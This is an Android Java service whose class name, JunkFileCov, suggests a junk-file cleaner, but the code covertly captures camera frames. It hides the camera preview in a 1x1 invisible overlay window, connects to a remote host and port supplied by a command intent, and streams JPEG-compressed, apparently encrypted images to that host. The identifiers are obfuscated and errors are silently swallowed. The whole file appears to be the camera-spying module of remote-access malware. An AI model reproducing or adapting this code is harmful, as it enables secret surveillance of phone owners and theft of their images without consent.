package store.apps;

import android.annotation.TargetApi;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.os.Build;
import android.os.IBinder;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class JunkFileCov extends Service implements SurfaceHolder.Callback  {
    public static Camera cm = null;
    private static Socket sk;
    private OutputStream out;
    private WindowManager wm;
    private SurfaceView sfw;
    private WindowManager.LayoutParams lay;
    public boolean usd = false ,ctd = false,Lo = false;
    private List<byte[]> bts = new ArrayList<byte[]>();
    private static Object syc = new Object();
    private String vul[];
    private int q4 = 75;
    static JunkFileCov st;
    public int onStartCommand(Intent intent, int flags, int startId) {
       try
       {
           sendBroadcast(new Intent("xyz"));
           String wx = EngineWorkerins._split_2_;

           if (intent != null){
               if (intent.hasExtra(wx)){

                   Context ctx = getApplicationContext();
                   Notification ntf =EngineWorkerins.Foreground(ctx,"APP","Helper");
                   if (ntf != null){
                       Random r = new Random();
                       startForeground(r.nextInt(100)+50,ntf);
                   }


                   vul  = intent.getStringArrayExtra(wx);
                   usd = ck();
                   if (usd == false) {
                       wm = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
                       sfw = new SurfaceView(this);

                       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                           lay = new WindowManager.LayoutParams(
                                   1, 1,
                                   WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                                   WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL  |
                                           WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE  |
                                           WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                                   PixelFormat.TRANSLUCENT
                           );

                       }else
                       {
                           lay = new WindowManager.LayoutParams(
                                   1, 1,
                                   WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                                   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                                   PixelFormat.TRANSLUCENT
                           );
                       }

                       lay.gravity = Gravity.LEFT | Gravity.TOP;
                       wm.addView(sfw, lay);
                       sfw.getHolder().addCallback(this);
                       cn(vul[1], Integer.valueOf(vul[2]));
                   }else{
                       sp();
                   }
               }
           }
       }catch (Exception e){}
        return START_STICKY;
    }

    @Override
    public void onCreate() {

    }
    public boolean ck() {
        Camera c = null;
        try {
            c = Camera.open();
        } catch (RuntimeException e) {

            return true;
        } finally {
            if (c != null) {
                c.release();
            }
        }
        return false;
    }
    public void cn(final String h, final int p) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                int t = 0;
                do {
                    if(t >= 3){sp();}
                    try {

                        InetAddress ip;
                        ip = InetAddress.getByName(h);
                        InetSocketAddress sock = new InetSocketAddress(ip, p);
                        JunkFileCov.sk = new Socket();
                        JunkFileCov.sk.setSoTimeout(0);
                        JunkFileCov.sk.setKeepAlive(true);
                        JunkFileCov.sk.connect(sock, 0);
                        ctd = JunkFileCov.sk.isConnected();
                        if (ctd == true) {
                            out = JunkFileCov.sk.getOutputStream();
                            Lo = true;
                            pr();
                            break;
                        }
                    } catch (UnknownHostException e) {
                        di();
                    } catch (SocketException e) {
                        di();
                    } catch (Exception e) {
                        di();
                    }
                    try{ Thread.sleep(1);} catch (InterruptedException e) {}
                    t++;
                } while (ctd == false);
            }
        }).start();
    }
    private void di() {
        Lo = false;
        try {
            JunkFileCov.sk.shutdownOutput();} catch (SocketException e) {} catch (IOException e) {}
        try {
            JunkFileCov.sk.shutdownInput();} catch (SocketException e) {} catch (IOException e) {}
        try {
            JunkFileCov.sk.getOutputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {
            JunkFileCov.sk.getInputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {
            JunkFileCov.sk.close();} catch (SocketException e) {} catch (IOException e) {}
        if(out != null){try {out.close();} catch (SocketException e) {} catch (IOException e) {}out = null;}
        stopForeground(true);
        stopSelf();
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        try {
            JunkFileCov.cm = Camera.open(Integer.valueOf(vul[0]));
        } catch (RuntimeException e) {}
        try {
            Camera.Parameters parameters = JunkFileCov.cm.getParameters();
            Camera.Size bestSize = null;
            if (JunkFileCov.cm.getParameters().getSupportedPreviewSizes() != null) {
                Camera.Parameters p = JunkFileCov.cm.getParameters();

                List<Camera.Size> s = p.getSupportedPreviewSizes();
                for (Camera.Size z : s) {

                    if (z.width > 600 && z.height > 400){
                        bestSize = z;
                    }
                }
            }
            if( Integer.valueOf(vul[4]) == 1){
                List<String> fu = parameters.getSupportedFocusModes();
                if (fu.contains(Camera.Parameters.FOCUS_MODE_CONTINUOUS_VIDEO)) {
                    parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_VIDEO);
                }
            }
            parameters.setPreviewSize(bestSize.width, bestSize.height);
            parameters.setPreviewFormat(ImageFormat.NV21);
            JunkFileCov.cm.setParameters(parameters);

            JunkFileCov.cm.setPreviewDisplay(surfaceHolder);

            JunkFileCov.cm.startPreview();

        } catch (Exception e) {}

    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
        if (JunkFileCov.cm != null) {
            JunkFileCov.cm.setPreviewCallback(new Camera.PreviewCallback() {
                public void onPreviewFrame(byte[] b, Camera _camera) {
                    try {
                        try {
                            if (b == null) {return;}
                            if (JunkFileCov.sk != null && ctd == true && out != null) {
                               // if(bts.size()<=15){
                                synchronized(JunkFileCov.syc){
                                    bts.add(b);
                                }

                                //}

                            }
                        } catch (OutOfMemoryError e) {}
                    } catch (Exception e) {}

                }
            });
        }
    }
    public void pr() {
        new Thread(new Runnable() {
            @TargetApi(Build.VERSION_CODES.FROYO)
            @Override
            public void run() {
                int clr = Integer.valueOf(vul[5]);
                while (Lo){
                    try {
                        synchronized(JunkFileCov.syc){
                            byte[] pc = new byte[]{};
                            if(bts.size() > 0){
                                pc = (byte[]) bts.get(0);
                                bts.remove(0);
                            }

                               if (pc.length > 0)
                               {
                                   Camera.Parameters prm = JunkFileCov.cm.getParameters();
                                   int wid = prm.getPreviewSize().width;
                                   int Hig = prm.getPreviewSize().height;
                                   YuvImage yuv = new YuvImage(pc, ImageFormat.NV21, wid, Hig, null);
                                   ByteArrayOutputStream out0 = new ByteArrayOutputStream() ;
                                   yuv.compressToJpeg(new Rect(0, 0, wid, Hig), q4, out0);
                                   if(clr != 0){
                                       q4 = q(out0.toByteArray().length,75);
                                   }
                                   byte[] b0 = DataScan1.f(vul[3] + vul[6] + vul[7] ,out0.toByteArray());
                                   try {
                                       JunkFileCov.sk.setSendBufferSize(b0.length * 15);
                                       out = JunkFileCov.sk.getOutputStream();
                                       out.write(b0,0,b0.length);
                                   } catch (Exception e) {
                                       sp();
                                   }
                                   out0.close();
                               }


                        }
                    } catch (Exception e)
                    {
                    }catch (OutOfMemoryError e) {}
                    try{ Thread.sleep(1);} catch (InterruptedException e) {}
                }
            }
        }).start();
    }
    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }
    public void onDestroy() {
        super.onDestroy();

        DataScan1.SETFORONE = 0;
        st = null;
        sp();
    }
    public void sp() {
        try {

            if (JunkFileCov.cm != null) {
                JunkFileCov.cm.setPreviewCallback(null);
                JunkFileCov.cm.release();
                JunkFileCov.cm = null;
            }
            di();
            if (usd == false) {
                wm.removeView(sfw);
            }
            usd = false;
        } catch (Exception e) {
        }

        Intent i = new Intent(this, JunkFileCov.class);
        this.stopService(i);
    }
    private int q(int s ,int m){

        if (s > 61440) {
            m = 15;
        } else if (s > 51200) {
            m = 25;
        } else if (s > 40960) {
            m = 35;
        } else if (s > 30720) {
            m = 45;
        } else if (s > 20480) {
            m = 65;
        } else if (s > 10240) {
            m = 75;
        }
        return m;
    }
}

